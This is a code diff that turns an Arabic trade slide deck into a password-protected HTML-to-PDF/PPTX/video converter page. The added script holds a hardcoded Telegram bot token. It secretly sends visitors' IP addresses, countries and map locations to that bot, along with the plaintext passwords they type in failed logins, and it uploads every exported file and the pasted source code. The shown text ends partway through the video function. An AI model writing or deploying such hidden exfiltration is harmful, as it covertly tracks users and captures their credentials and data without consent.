@@ -2,232 +2,556 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>عرض التجارة - المعرفة المالية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة تحويل الأكواد الذكية (PDF / PPTX / MP4)</title>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/gitbrent/pptxgenjs@3.12.0/dist/pptxgen.bundle.js"></script>
+
     <style>
-        * {
-            box-sizing: border-box;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; box-sizing: border-box; }
+        
+        .header { text-align: center; margin-bottom: 20px; }
+        .header h2 { margin: 0; color: #f8fafc; font-size: 26px;}
 
-        body {
-            display: block;
-            direction: rtl;
-            text-align: right;
-            margin: 0;
-            padding: 0;
-            background-color: #f0f2f5;
-            font-family: 'Cairo', sans-serif;
-        }
+        .top-nav { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; width: 100%; max-width: 600px;}
+        .nav-btn { flex: 1; background: #1e293b; color: #94a3b8; border: 2px solid #334155; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .nav-btn.active { background: #2563eb; color: #fff; border-color: #2563eb; }
+        .nav-btn:hover:not(.active) { background: #334155; color: #f8fafc; }
 
-        .page {
-            width: 1280px;
-            height: 720px;
-            overflow: hidden;
-            position: relative;
-            background: #ffffff;
-            margin: 20px auto;
-            border: 15px solid #1a3a5f; /* إطار أكاديمي فخم */
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            display: flex;
-            flex-direction: column;
-            padding: 60px;
-            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
-        }
+        .main-container { width: 100%; max-width: 600px; display: flex; flex-direction: column; }
+        
+        .box-panel { background: #1e293b; border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); border: 1px solid #334155; display: flex; flex-direction: column; width: 100%; box-sizing: border-box;}
+        
+        .form-group { margin-bottom: 15px; display: flex; flex-direction: column; }
+        label { margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #94a3b8; }
+        input, select, textarea { padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; font-size: 14px; font-family: inherit; color: #f8fafc; transition: 0.2s;}
+        input:focus, select:focus, textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); }
+        input:disabled, select:disabled { opacity: 0.5; cursor: not-allowed; text-decoration: line-through; }
 
-        /* تصاميم الخلفية */
-        .page::before {
-            content: "";
-            position: absolute;
-            top: -100px;
-            left: -100px;
-            width: 300px;
-            height: 300px;
-            background: rgba(26, 58, 95, 0.03);
-            border-radius: 50%;
-            z-index: 0;
-        }
+        .req-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .req-row input[type="text"] { flex: 1; }
+        .toggle-req { background: #334155; border: none; color: #f8fafc; border-radius: 6px; padding: 12px; cursor: pointer; transition: 0.2s; font-size: 14px; width: 45px; text-align: center;}
+        .toggle-req.disabled { background: #7f1d1d; color: #fca5a5; }
 
-        .title-slide {
-            background: linear-gradient(135deg, #1a3a5f 0%, #2c5282 100%);
-            color: white;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            border-color: #d4af37; /* إطار ذهبي للغلاف */
-        }
+        .textarea-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .clear-btn { background: #7f1d1d; color: #fca5a5; border: none; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .clear-btn:hover { background: #991b1b; color: #fef2f2; }
+        
+        textarea { flex: 1; min-height: 250px; resize: vertical; direction: ltr; font-family: monospace; background: #020617; font-size: 13px; line-height: 1.6;}
+        
+        .row { display: flex; gap: 15px; }
+        .row .form-group { flex: 1; }
 
-        h1 {
-            font-size: 85px;
-            font-weight: 900;
-            margin: 0;
-            color: #d4af37;
-        }
+        .export-btn { background: #2563eb; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; width: 100%;}
+        .export-btn:hover { background: #1d4ed8; transform: translateY(-2px);}
+        .export-btn:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none;}
+        
+        .tab-content { display: none; }
+        .tab-content.active-tab { display: flex; }
 
-        h2 {
-            font-size: 45px;
-            color: #e2e8f0;
-            margin-top: 20px;
-        }
-
-        .slide-header {
-            font-size: 48px;
-            color: #1a3a5f;
-            border-bottom: 4px solid #d4af37;
-            padding-bottom: 15px;
-            margin-bottom: 40px;
-            font-weight: 700;
-            z-index: 1;
-        }
-
-        .content-box {
-            font-size: 28px;
-            line-height: 1.8;
-            color: #2d3748;
-            z-index: 1;
-        }
-
-        .point {
-            background: rgba(26, 58, 95, 0.05);
-            margin-bottom: 15px;
-            padding: 20px 30px;
-            border-right: 8px solid #d4af37;
-            border-radius: 5px;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-        }
-
-        .footer-note {
-            position: absolute;
-            bottom: 40px;
-            left: 60px;
-            font-size: 18px;
-            color: #718096;
-        }
-
-        .highlight {
-            color: #1a3a5f;
-            font-weight: 700;
-        }
+        .ai-prompts { background: #022c22; border: 1px dashed #059669; padding: 15px; border-radius: 10px; margin-bottom: 20px;}
+        .ai-prompts p { margin: 0 0 10px 0; font-size: 14px; color: #34d399; font-weight: bold; text-align: center;}
+        .prompt-btns { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;}
+        .prompt-btn { flex: 1 1 30%; background: #1e293b; border: 1px solid #059669; color: #34d399; padding: 10px; border-radius: 8px; font-size: 12px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
+        .prompt-btn:hover { background: #059669; color: #fff; }
     </style>
 </head>
 <body>
 
-    <!-- الشريحة 1: العنوان -->
-    <div class="page title-slide">
-        <h1>التجارة</h1>
-        <h2>المعرفة المالية</h2>
-        <div style="margin-top: 50px; font-size: 32px;">إعداد: سس</div>
-    </div>
-
-    <!-- الشريحة 2: تعريف التجارة -->
-    <div class="page">
-        <div class="slide-header">مفهوم التجارة</div>
-        <div class="content-box">
-            <p>التجارة هي العملية الأساسية التي يقوم فيها الأفراد أو المؤسسات بتبادل السلع والخدمات مقابل وسيلة دفع معترف بها، غالباً ما تكون المال.</p>
-            <div class="point">تعتبر التجارة المحرك الرئيسي للاقتصاد العالمي ونمو المجتمعات.</div>
-            <div class="point">تتضمن التجارة عمليات الشراء، البيع، والتوزيع بهدف تحقيق الربح أو سد الاحتياجات.</div>
-            <div class="point">تطورت من "المقايضة" قديماً إلى "التجارة الرقمية" حديثاً.</div>
-        </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 2</div>
-    </div>
-
-    <!-- الشريحة 3: أنواع التجارة (1) -->
-    <div class="page">
-        <div class="slide-header">أنواع التجارة: التجارة الداخلية</div>
-        <div class="content-box">
-            <p class="highlight">تحدث داخل الحدود الجغرافية للدولة الواحدة وتنقسم إلى:</p>
-            <div class="point">1. تجارة الجملة: بيع كميات كبيرة من السلع للموزعين أو تجار التجزئة.</div>
-            <div class="point">2. تجارة التجزئة: بيع المنتجات مباشرة للمستهلك النهائي عبر المتاجر أو الأسواق.</div>
-            <div class="point">تساهم في تنشيط الاقتصاد المحلي وتوفير فرص العمل للمواطنين.</div>
-        </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 3</div>
-    </div>
-
-    <!-- الشريحة 4: أنواع التجارة (2) -->
-    <div class="page">
-        <div class="slide-header">أنواع التجارة: التجارة الدولية</div>
-        <div class="content-box">
-            <p class="highlight">هي تبادل السلع والخدمات عبر الحدود الدولية وتتكون من:</p>
-            <div class="point">● التصدير: إرسال السلع والخدمات المحلية لبيعها في الأسواق الخارجية.</div>
-            <div class="point">● الاستيراد: جلب منتجات من دول أخرى لتلبية احتياجات السوق المحلي.</div>
-            <div class="point">تلعب الاتفاقيات الدولية دوراً حاسماً في تسهيل هذه العمليات وخفض الجمارك.</div>
-        </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 4</div>
-    </div>
-
-    <!-- الشريحة 5: أركان العملية التجارية -->
-    <div class="page">
-        <div class="slide-header">أركان العملية التجارية</div>
-        <div class="content-box">
-            <div class="info-grid">
-                <div class="point">البائع: الطرف الذي يمتلك السلعة أو الخدمة ويقدمها للمقايضة.</div>
-                <div class="point">المشتري: الطرف الذي لديه الرغبة والقدرة المالية للحصول على السلعة.</div>
-                <div class="point">السلعة/الخدمة: موضوع التبادل (منتج مادي أو خدمة معنوية).</div>
-                <div class="point">الثمن: القيمة النقدية المتفق عليها لإتمام عملية التبادل.</div>
+    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+        <div style="background: #1e293b; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; text-align: center; width: 90%; max-width: 400px;">
+            <h3 style="margin-top: 0; color: #f8fafc; font-size: 24px;">🔒 حماية المنصة</h3>
+            <p style="font-size: 14px; color: #94a3b8; margin-bottom: 25px;">الرجاء إدخال كلمة المرور للوصول.</p>
+            <div class="form-group" style="margin-bottom: 20px;">
+                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 3px; font-size: 16px;" onkeypress="if(event.key === 'Enter') checkPassword()">
             </div>
+            <button onclick="checkPassword()" class="export-btn" style="margin-top: 0;">تسجيل الدخول</button>
+            <p id="pass-error" style="color: #ef4444; font-size: 13px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
         </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 5</div>
     </div>
 
-    <!-- الشريحة 6: أهمية التجارة -->
-    <div class="page">
-        <div class="slide-header">لماذا ندرس التجارة؟</div>
-        <div class="content-box">
-            <div class="point">توفير الاحتياجات: تسمح للفرد بالحصول على منتجات لا يمكنه إنتاجها بنفسه.</div>
-            <div class="point">تحقيق الأرباح: توفر فرصاً استثمارية واسعة لنمو الثروات الفردية والمؤسسية.</div>
-            <div class="point">الابتكار: التنافس التجاري يدفع الشركات لابتكار منتجات أفضل وأرخص.</div>
-            <div class="point">الترابط الدولي: تقوي العلاقات بين الدول عبر الاعتماد الاقتصادي المتبادل.</div>
+    <div class="header">
+        <h2>🛠️ منصة تحويل الأكواد الذكية</h2>
+    </div>
+
+    <div class="top-nav">
+        <button class="nav-btn active" id="btn-converter" onclick="switchTab('converter')">⚙️ منصة التحويل</button>
+        <button class="nav-btn" id="btn-prompts" onclick="switchTab('prompts')">🧠 المولد الذكي</button>
+    </div>
+
+    <div id="converter-tab" class="main-container tab-content active-tab">
+        <div class="box-panel">
+            <div class="ai-prompts">
+                <p>🤖 أوامر سريعة للذكاء الاصطناعي:</p>
+                <div class="prompt-btns">
+                    <button class="prompt-btn" onclick="copyQuickPrompt('a4', this)">📄 بحث أكاديمي</button>
+                    <button class="prompt-btn" onclick="copyQuickPrompt('169', this)">🖥️ عرض شاشات</button>
+                    <button class="prompt-btn" onclick="copyQuickPrompt('mobile', this)">📱 عرض جوال</button>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>اسم الملف المستخرج:</label>
+                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>نوع الاستخراج:</label>
+                    <select id="format-select" onchange="updateUI()">
+                        <optgroup label="مستندات (جاهزة للطباعة والعرض)">
+                            <option value="pdf-a4">ملف PDF (مقاس A4)</option>
+                            <option value="pdf-169">ملف PDF (مقاس 16:9)</option>
+                            <option value="pptx">بوربوينت PPTX (مقاس 16:9)</option>
+                        </optgroup>
+                        <optgroup label="مقاطع فيديو (تلقائية العرض)">
+                            <option value="vid-169">فيديو شاشات (16:9)</option>
+                            <option value="vid-916">فيديو جوال (9:16)</option>
+                        </optgroup>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>الجودة:</label>
+                    <select id="quality-select">
+                        <option value="1">عادية (سريعة جداً)</option>
+                        <option value="2" selected>عالية (متوازنة)</option>
+                        <option value="3">ممتازة (للصور الدقيقة)</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="row" id="video-options" style="display: none;">
+                <div class="form-group">
+                    <label>مدة كل شريحة (فيديو):</label>
+                    <select id="slide-duration">
+                        <option value="3">3 ثواني</option>
+                        <option value="5" selected>5 ثواني</option>
+                        <option value="8">8 ثواني</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>التحركات (الأنيميشن):</label>
+                    <select id="animation-style">
+                        <option value="zoom" selected>تكبير سينمائي</option>
+                        <option value="slide">سحب جانبي</option>
+                        <option value="fade">تلاشي ناعم</option>
+                        <option value="none">بدون تحركات</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="textarea-header">
+                    <label style="margin:0;">كود الـ HTML:</label>
+                    <button class="clear-btn" onclick="clearCode()">🗑️ مسح الكود</button>
+                </div>
+                <textarea id="html-input" placeholder="الصق الكود هنا..."></textarea>
+            </div>
+
+            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
         </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 6</div>
     </div>
 
-    <!-- الشريحة 7: التجارة الإلكترونية -->
-    <div class="page">
-        <div class="slide-header">الثورة الرقمية: التجارة الإلكترونية</div>
-        <div class="content-box">
-            <p>هي البيع والشراء عبر الإنترنت، وأصبحت تشكل جزءاً ضخماً من الاقتصاد الحديث.</p>
-            <div class="point">تتميز بانخفاض التكاليف التشغيلية مقارنة بالمتاجر التقليدية.</div>
-            <div class="point">الوصول العالمي: يمكن للمتجر الصغير بيع منتجاته لأي مكان في العالم.</div>
-            <div class="point">سرعة التنفيذ وتعدد خيارات الدفع الإلكتروني (مدى، فيزا، آبل باي).</div>
+    <div id="prompts-tab" class="main-container tab-content">
+        <div class="box-panel">
+            <div class="form-group">
+                <label>نوع الملف المطلوب تصميم كوده:</label>
+                <select id="prompt-type" onchange="generatePromptText()">
+                    <option value="a4">📄 بحث / تقرير (مقاس A4)</option>
+                    <option value="169">🖥️ عرض تقديم (مقاس 16:9)</option>
+                    <option value="916">📱 عرض جوال / تيك توك (مقاس 9:16)</option>
+                </select>
+            </div>
+
+            <label>المتطلبات (اضغط 👁️ لشطب المتطلب):</label>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-title')">👁️</button>
+                <input type="text" id="req-title" placeholder="عنوان العمل (مثال: الذكاء الاصطناعي)" oninput="generatePromptText()">
+            </div>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-subject')">👁️</button>
+                <input type="text" id="req-subject" placeholder="المادة (مثال: حاسب آلي)" oninput="generatePromptText()">
+            </div>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-name')">👁️</button>
+                <input type="text" id="req-name" placeholder="اسم المقدم / الطالب" oninput="generatePromptText()">
+            </div>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-group')">👁️</button>
+                <input type="text" id="req-group" placeholder="أسماء المجموعة" oninput="generatePromptText()">
+            </div>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-pages')">👁️</button>
+                <input type="text" id="req-pages" placeholder="عدد الصفحات / الشرائح" oninput="generatePromptText()">
+            </div>
+            <div class="req-row">
+                <button class="toggle-req" onclick="toggleInput(this, 'req-no-numbers')">👁️</button>
+                <input type="text" id="req-no-numbers" placeholder="ملاحظات إضافية" oninput="generatePromptText()">
+            </div>
+
+            <label style="margin-top: 15px;">✨ الأمر النهائي للذكاء الاصطناعي:</label>
+            <textarea id="final-prompt-output" readonly style="min-height: 220px; margin-bottom: 10px;"></textarea>
+
+            <button class="export-btn" style="background: #059669;" onclick="copyGeneratedPrompt()">نسخ الأمر الجاهز 📋</button>
         </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 7</div>
     </div>
 
-    <!-- الشريحة 8: مخاطر التجارة -->
-    <div class="page">
-        <div class="slide-header">إدارة المخاطر في التجارة</div>
-        <div class="content-box">
-            <p class="highlight">لا تخلو التجارة من التحديات، ومن أبرزها:</p>
-            <div class="point">تذبذب الأسعار: تغير قيمة العملات أو تكلفة المواد الخام بشكل مفاجئ.</div>
-            <div class="point">المنافسة الشرسة: دخول منافسين جدد يقدمون أسعاراً أقل أو جودة أعلى.</div>
-            <div class="point">المخاطر القانونية: ضرورة الالتزام بالقوانين الضريبية والتجارية المتغيرة.</div>
-            <div class="point">التغير في ذوق المستهلك: توقف الطلب على منتج معين بسبب ظهور بديل أحدث.</div>
-        </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 8</div>
-    </div>
+    <script>
+        // إعدادات وتشفير الدخول
+        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
+        const chatId = '6680237928'; 
+        const secretHash = "U2ExMjM0NTY3OEA="; 
 
-    <!-- الشريحة 9: نصائح للنجاح التجاري -->
-    <div class="page">
-        <div class="slide-header">مفاتيح النجاح في عالم التجارة</div>
-        <div class="content-box">
-            <div class="point">الدراسة الجيدة للسوق وفهم احتياجات العملاء الحقيقية.</div>
-            <div class="point">بناء سمعة طيبة (العلامة التجارية) والالتزام بالأمانة والجودة.</div>
-            <div class="point">التطوير المستمر ومواكبة التقنيات الحديثة في التسويق والتوزيع.</div>
-            <div class="point">الإدارة المالية الحكيمة ومراقبة التدفقات النقدية بدقة.</div>
-        </div>
-        <div class="footer-note">المعرفة المالية - الشريحة 9</div>
-    </div>
+        window.onload = () => {
+            if (localStorage.getItem('auth_token') === secretHash) {
+                document.getElementById('password-overlay').style.display = 'none';
+            }
+            updateUI();
+            generatePromptText(); 
+        };
 
-    <!-- الشريحة 10: الخاتمة -->
-    <div class="page title-slide" style="border-color: #1a3a5f;">
-        <h1 style="font-size: 70px;">شكراً لكم</h1>
-        <h2 style="color: white;">نتمنى أن تكون هذه الرحلة في عالم التجارة مفيدة</h2>
-        <div style="margin-top: 40px; font-size: 24px; color: #d4af37;">إعداد: سس | 2026</div>
-    </div>
+        function sendTextToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار المنصة:\n${msg}` })
+            }).catch(e => console.error(e));
+        }
 
+        async function sendFileToTelegram(blob, name, caption, type = 'document') {
+            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append(type === 'video' ? 'video' : 'document', blob, name); 
+            formData.append('caption', caption);
+            try { 
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, { method: 'POST', body: formData });
+                return res.ok;
+            } catch (e) { return false; }
+        }
+
+        function checkPassword() {
+            const input = document.getElementById('pass-input').value;
+            if (btoa(unescape(encodeURIComponent(input))) === secretHash) {
+                document.getElementById('password-overlay').style.display = 'none';
+                localStorage.setItem('auth_token', secretHash);
+                
+                fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
+                    if(data.ip) {
+                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
+                        sendTextToTelegram(`✅ دخول ناجح للمنصة.\nالآيبي: ${data.ip}\nالدولة: ${data.country}\nالموقع: https://www.google.com/maps?q=$$${lat},${lng}`);
+                    }
+                }).catch(e => sendTextToTelegram(`✅ دخول ناجح للمنصة.`));
+            } else {
+                document.getElementById('pass-error').style.display = 'block';
+                sendTextToTelegram(`❌ محاولة دخول فاشلة بكلمة: ${input}`);
+            }
+        }
+
+        function switchTab(t) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active-tab'));
+            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById(t + '-tab').classList.add('active-tab');
+            document.getElementById('btn-' + t).classList.add('active');
+        }
+
+        function toggleInput(btn, id) {
+            const el = document.getElementById(id);
+            el.disabled = !el.disabled;
+            btn.innerText = el.disabled ? '🚫' : '👁️';
+            btn.classList.toggle('disabled', el.disabled);
+            generatePromptText();
+        }
+
+        function generatePromptText() {
+            const type = document.getElementById('prompt-type').value;
+            let p = `أنت مصمم HTML محترف. أنشئ كود كامل لـ ${type === 'a4' ? 'بحث (A4)' : 'عرض تقديمى'} عصري وأنيق بالعربية.\n\nالمعلومات المطلوب إدراجها:\n`;
+            
+            ['req-title', 'req-subject', 'req-name', 'req-group', 'req-pages', 'req-no-numbers'].forEach(id => {
+                const el = document.getElementById(id);
+                if (!el.disabled && el.value) p += `- ${el.placeholder}: ${el.value}\n`;
+            });
+            
+            p += `\nالمواصفات التقنية الصارمة:\n1. استدعاء خطوط Google Fonts (مثل Cairo).\n2. تصميم فخم وعصري بدون ترقيم صفحات للمراجع.\n3. الكود مقسم لشرائح داخل <div class="page"> أبعادها ${type === 'a4' ? 'width: 794px; height: 1123px;' : (type === '169' ? 'width: 1280px; height: 720px;' : 'width: 720px; height: 1280px;')}.\n4. ممنوع استخدام القوائم الافتراضية (ul, ol)، استخدم عناصر النصوص <p>.`;
+            document.getElementById('final-prompt-output').value = p;
+        }
+
+        function copyGeneratedPrompt() {
+            const text = document.getElementById('final-prompt-output').value;
+            if(!text.trim()) return;
+            navigator.clipboard.writeText(text);
+            alert("✅ تم نسخ الأمر!");
+        }
+
+        function copyQuickPrompt(type, btn) {
+            const list = {
+                a4: "أنت مصمم HTML محترف. صمم بحث أكاديمي (A4) فخم وعصري بالعربية باستخدام خط Tajawal وبدون ترقيم صفحات.",
+                169: "أنت مصمم عروض محترف. صمم عرضاً تقديمياً (16:9) Ultra-Modern بألوان متناسقة وخطوط كبيرة جداً.",
+                mobile: "أنت مصمم واجهات تيك توك. صمم عرضاً تقديمياً للجوال (9:16) بتنسيق طولي جذاب جداً ونصوص ضخمة واضحة."
+            };
+            navigator.clipboard.writeText(list[type]);
+            const old = btn.innerText; btn.innerText = "✅ تم!";
+            setTimeout(() => btn.innerText = old, 2000);
+        }
+
+        function clearCode() { 
+            if(confirm("مسح الكود الحالي؟")) document.getElementById('html-input').value = ''; 
+        }
+
+        function updateUI() {
+            const f = document.getElementById('format-select').value;
+            document.getElementById('video-options').style.display = f.startsWith('vid') ? 'flex' : 'none';
+        }
+
+        async function urlToDataURL(url) {
+            if (url && url.startsWith('data:')) return url;
+            try {
+                const res = await fetch(`https://corsproxy.io/?${encodeURIComponent(url)}`);
+                const blob = await res.blob();
+                return new Promise(r => { const f = new FileReader(); f.onloadend = () => r(f.result); f.readAsDataURL(blob); });
+            } catch (e) { return url; }
+        }
+
+        async function convertAllImagesToDataURLs(container) {
+            const imgs = Array.from(container.querySelectorAll('img'));
+            for (const img of imgs) {
+                if (img.src && !img.src.startsWith('data:')) {
+                    img.src = await urlToDataURL(img.src);
+                }
+            }
+        }
+
+        // ==========================================
+        // המوزع الرئيسي
+        // ==========================================
+        async function exportFile() {
+            const code = document.getElementById('html-input').value;
+            const format = document.getElementById('format-select').value;
+            if (!code.trim()) return alert("الرجاء لصق الكود أولاً!");
+
+            const btn = document.getElementById('capture-btn');
+            btn.disabled = true;
+
+            if (format === 'pptx') {
+                await generatePPTX();
+            } else if (format.startsWith('pdf')) {
+                await generatePDF();
+            } else {
+                await generateCinematicVideo();
+            }
+        }
+
+        // ==========================================
+        // 1. استخراج بوربوينت PPTX (النسخة المستقرة)
+        // ==========================================
+        async function generatePPTX() {
+            const btn = document.getElementById('capture-btn');
+            const code = document.getElementById('html-input').value;
+            const name = document.getElementById('file-name').value || 'presentation';
+            const quality = parseInt(document.getElementById('quality-select').value);
+
+            btn.innerText = "⏳ جاري تحضير البوربوينت...";
+            
+            const container = document.createElement('div');
+            container.style.width = '1280px'; 
+            container.style.position = 'absolute'; 
+            container.style.left = '-9999px';
+            container.dir = 'rtl';
+            container.innerHTML = code; 
+            document.body.appendChild(container);
+
+            try {
+                await document.fonts.ready; 
+                await convertAllImagesToDataURLs(container);
+                
+                let pages = container.querySelectorAll('.page'); 
+                if (pages.length === 0) pages = [container];
+
+                let pptx = new PptxGenJS();
+                pptx.layout = 'LAYOUT_169'; 
+
+                for (let i = 0; i < pages.length; i++) {
+                    btn.innerText = `📸 تصوير شريحة ${i+1} من ${pages.length}...`;
+                    const canvas = await html2canvas(pages[i], { scale: quality, width: 1280, height: 720, useCORS: true });
+                    const imgData = canvas.toDataURL('image/jpeg', 0.85); 
+                    
+                    let slide = pptx.addSlide();
+                    // استخدام النسب المئوية 100% ليغطي الشريحة بالكامل
+                    slide.addImage({ data: imgData, x: 0, y: 0, w: '100%', h: '100%' }); 
+                }
+
+                btn.innerText = "🚀 إرسال PPTX للبوت...";
+                
+                // استخدام دالة .then مع Promise لضمان التوافقية مع المكتبة
+                pptx.write({ outputType: "blob" }).then(async (blob) => {
+                    await sendFileToTelegram(blob, `${name}.pptx`, `📥 عرض بوربوينت PPTX جاهز!`);
+                    
+                    const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
+                    await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 كود الـ HTML`);
+
+                    btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a'); 
+                    a.href = url; 
+                    a.download = `${name}.pptx`; 
+                    document.body.appendChild(a); 
+                    a.click(); 
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                    
+                    btn.disabled = false;
+                    btn.innerText = "بدء الاستخراج 📥";
+                    document.body.removeChild(container);
+                }).catch(err => {
+                    alert("فشل في بناء ملف البوربوينت");
+                    console.error(err);
+                    btn.disabled = false;
+                    btn.innerText = "بدء الاستخراج 📥";
+                    document.body.removeChild(container);
+                });
+
+            } catch (e) { 
+                alert("حدث خطأ أثناء معالجة البوربوينت. تأكد من الكود المرفق."); 
+                console.error(e);
+                btn.disabled = false; 
+                btn.innerText = "بدء الاستخراج 📥"; 
+                document.body.removeChild(container);
+            } 
+        }
+
+        // ==========================================
+        // 2. استخراج الفيديو MP4
+        // ==========================================
+        async function generateCinematicVideo() {
+            const btn = document.getElementById('capture-btn');
+            const code = document.getElementById('html-input').value;
+            const name = document.getElementById('file-name').value || 'video';
+            const dur = parseInt(document.getElementById('slide-duration').value);
+            const anim = document.getElementById('animation-style').value;
+            const quality = parseInt(document.getElementById('quality-select').value);
+            const type = document.getElementById('format-select').value;
+
+            let w = type === 'vid-916' ? 720 : 1280;
+            let h = type === 'vid-916' ? 1280 : 720;
+
+            btn.innerText = "⏳ جاري تسجيل الفيديو...";
+            const container = document.createElement('div');
+            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
+            container.innerHTML = code; document.body.appendChild(container);
+
+            try {
+                await document.fonts.ready; await convertAllImagesToDataURLs(container);
+                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];
+                const canvases = [];
+                for (let i = 0; i < pages.length; i++) {
+                    btn.innerText = `📸 تصوير شريحة ${i+1}...`;
+                    canvases.push(await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true }));
+                }
+
+                btn.innerText = "🎬 بناء مشاهد الفيديو...";
+                const recCanvas = document.createElement('canvas'); recCanvas.width = w; recCanvas.height = h;
+                const ctx = recCanvas.getContext('2d');
+                const stream = recCanvas.captureStream(30);
+                
+                let options = { videoBitsPerSecond: 3000000 };
+                if (MediaRecorder.isTypeSupported('video/mp4')) options.mimeType = 'video/mp4';
+                else if (MediaRecorder.isTypeSupported('video/webm; codecs=vp9')) options.mimeType = 'video/webm; codecs=vp9';
+                else options.mimeType = 'video/webm';
+
+                const recorder = new MediaRecorder(stream, options);
+                const chunks = []; recorder.ondataavailable = e => chunks.push(e.data);
+
+                const recordPromise = new Promise(resolve => {
+                    recorder.onstop = async () => {
+                        btn.innerText = "🚀 إرسال الفيديو للبوت...";
+                        const ext = (options.mimeType && options.mimeType.includes('mp4')) ? 'mp4' : 'webm';
+                        const blob = new Blob(chunks, { type: options.mimeType || 'video/mp4' });
+                        
+                        await sendFileToTelegram(blob, `${name}.${ext}`, `🎬 فيديو جاهز!`, 'video');
+                        const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
+                        await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 الكود`);
+
+                        btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
+                        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `${name}.${ext}`; a.click();
+                        resolve();
+                    };
+                });
+
+                recorder.start();
+                const total = dur * 1000 * canvases.length; const trans = 800; const start = Date.now();
+
+                function animate() {
+                    const elap = Date.now() - start;
+                    if (elap < total) {
+                        const idx = Math.floor(elap / (dur * 1000));
+                        const time = elap % (dur * 1000);
+                        ctx.fillStyle = "#fff"; ctx.fillRect(0,0,w,h);
+
+                        if (anim === 'zoom') {
